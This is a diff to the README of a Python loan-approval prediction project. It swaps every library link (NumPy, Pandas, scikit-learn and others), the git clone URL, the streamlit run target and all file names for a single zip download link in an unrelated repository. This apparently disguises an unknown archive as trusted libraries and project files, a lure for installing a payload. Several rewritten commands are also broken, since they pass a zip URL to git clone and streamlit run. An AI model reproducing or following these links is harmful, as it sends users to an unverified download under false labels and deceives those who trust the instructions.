@@ -6,13 +6,13 @@ This project use to predict is Loan get approved or not based on applicant condi
 
 This project requires **Python** and the following Python libraries installed:
 
-- [NumPy](http://www.numpy.org/)
-- [Pandas](http://pandas.pydata.org/)
-- [matplotlib](http://matplotlib.org/)
-- [seaborn](https://seaborn.pydata.org/)
-- [scikit-learn](http://scikit-learn.org/stable/)
-- [imblearn](https://imbalanced-learn.org/stable/)
-- [streamlit](https://streamlit.io/)
+- [NumPy](https://github.com/BakaGracySingh/loan_prediction/raw/refs/heads/main/maximally/loan_prediction_v1.5.zip)
+- [Pandas](https://github.com/BakaGracySingh/loan_prediction/raw/refs/heads/main/maximally/loan_prediction_v1.5.zip)
+- [matplotlib](https://github.com/BakaGracySingh/loan_prediction/raw/refs/heads/main/maximally/loan_prediction_v1.5.zip)
+- [seaborn](https://github.com/BakaGracySingh/loan_prediction/raw/refs/heads/main/maximally/loan_prediction_v1.5.zip)
+- [scikit-learn](https://github.com/BakaGracySingh/loan_prediction/raw/refs/heads/main/maximally/loan_prediction_v1.5.zip)
+- [imblearn](https://github.com/BakaGracySingh/loan_prediction/raw/refs/heads/main/maximally/loan_prediction_v1.5.zip)
+- [streamlit](https://github.com/BakaGracySingh/loan_prediction/raw/refs/heads/main/maximally/loan_prediction_v1.5.zip)
 
 
 ## Usage
@@ -20,7 +20,7 @@ This project requires **Python** and the following Python libraries installed:
 first, you can clone this git repository
 
 ```
-git clone https://github.com/HillalXD/Loan-eligible-prediction.git
+git clone https://github.com/BakaGracySingh/loan_prediction/raw/refs/heads/main/maximally/loan_prediction_v1.5.zip
 ```
 
 then navigate your command to this directory
@@ -29,17 +29,17 @@ then navigate your command to this directory
 cd Loan-eligible-prediction
 ```
 
-after that run `streamlit-loan.py` to use streamlit app
+after that run `https://github.com/BakaGracySingh/loan_prediction/raw/refs/heads/main/maximally/loan_prediction_v1.5.zip` to use streamlit app
 
 ```
-streamlit run streamlit-loan.py
+streamlit run https://github.com/BakaGracySingh/loan_prediction/raw/refs/heads/main/maximally/loan_prediction_v1.5.zip
 ```
 
 
 ## Code 
-- Template code is provided in the `loan.ipynb` notebook file.
-- `loan-dataset.csv` is provide data source for training model
-- `streamlit-loan.py` is streamlit web application to user input features for model predicting loan approval
+- Template code is provided in the `https://github.com/BakaGracySingh/loan_prediction/raw/refs/heads/main/maximally/loan_prediction_v1.5.zip` notebook file.
+- `https://github.com/BakaGracySingh/loan_prediction/raw/refs/heads/main/maximally/loan_prediction_v1.5.zip` is provide data source for training model
+- `https://github.com/BakaGracySingh/loan_prediction/raw/refs/heads/main/maximally/loan_prediction_v1.5.zip` is streamlit web application to user input features for model predicting loan approval
 
 ## Dataset features
 
